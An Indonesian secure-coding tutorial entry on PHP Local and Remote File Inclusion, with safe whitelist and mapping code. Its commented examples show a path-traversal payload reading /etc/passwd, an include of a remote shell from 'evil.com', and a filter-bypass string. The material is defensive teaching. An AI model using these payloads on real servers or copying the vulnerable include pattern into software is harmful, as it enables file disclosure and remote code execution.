# 289. File Inclusion LFI RFI

## Definisi Singkat
File Inclusion adalah kerentanan di mana penyerang bisa menyertakan file server melalui input user. LFI (Local File Inclusion) menyertakan file lokal, RFI (Remote File Inclusion) menyertakan file dari URL eksternal.

## Analogi
Seperti perpustakaan dengan sistem pinjam antar: petugas meminjamkan buku yang diminta. Jika tidak ada validasi, penjahat bisa meminta "buku" yang sebenarnya adalah dokumen rahasia (LFI) atau buku dari perpustakaan jahat (RFI).

## Poin-Poin Penting
- LFI: membaca file sensitif seperti `/etc/passwd`, config database
- RFI: eksekusi code dari server penyerang
- Penyebab: fungsi `include()`, `require()` dengan input user tanpa filter
- Gunakan whitelist path yang diizinkan
- Jangan gunakan input user langsung ke fungsi include/require
- Nonaktifkan `allow_url_include` di php.ini

## Contoh Kode (PHP)
```php
<?php
// RENTAN - JANGAN DITIRU
$page = $_GET['page'] ?? 'home';
// include("pages/$page.php"); // BISA: include("../../etc/passwd%00")
// include("http://evil.com/shell.txt"); // RFI

// AMAN: whitelist path
$allowedPages = ['home', 'about', 'contact', 'profile'];
$page = $_GET['page'] ?? 'home';

if (in_array($page, $allowedPages, true)) {
    include __DIR__ . "/pages/$page.php";
} else {
    http_response_code(404);
    echo "Halaman tidak ditemukan";
}

// Alternatif: mapping array
$pages = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php',
];

$page = $_GET['page'] ?? 'home';
if (isset($pages[$page]) && file_exists($pages[$page])) {
    include $pages[$page];
} else {
    http_response_code(404);
    include 'pages/404.php';
}

// Jangan pernah lakukan ini:
// $page = str_replace('../', '', $_GET['page']); // Bisa dilewati: ....//
// include "pages/" . $page . ".php";
?>
```

## Kasus Penggunaan Nyata
Aplikasi CMS dengan halaman dinamis, tema yang bisa dipilih user, plugin system, multi-language site.
